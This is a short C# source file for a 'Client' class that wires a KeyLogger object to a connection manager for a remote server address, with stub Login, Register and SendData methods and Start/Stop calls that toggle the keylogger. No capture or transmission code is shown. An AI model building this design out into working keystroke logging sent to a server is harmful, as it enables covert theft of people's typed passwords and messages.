using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;

namespace UPClient
{
    public class Client
    {
        ClientConnectionManager connection;
        KeyLogger keyLogger;
        Thread runThread;
        runningWnd UI;
        public Client(String serverAddress, runningWnd parent)
        {
            keyLogger = new KeyLogger();
            connection = new ClientConnectionManager(serverAddress);
            UI = parent;
        }
        public bool Login(String UserName, String Password)
        {
            return true;
        }
        public bool Register(String UserName, String Password)
        {
            return true;
        }
        public bool SendData()
        {
            return true;
        }
        public void Start()
        {
            if(!keyLogger.IsActive)
                keyLogger.Start();
        }
        public void Stop()
        {
            if(keyLogger.IsActive)
                keyLogger.Stop();
        }
    }
}
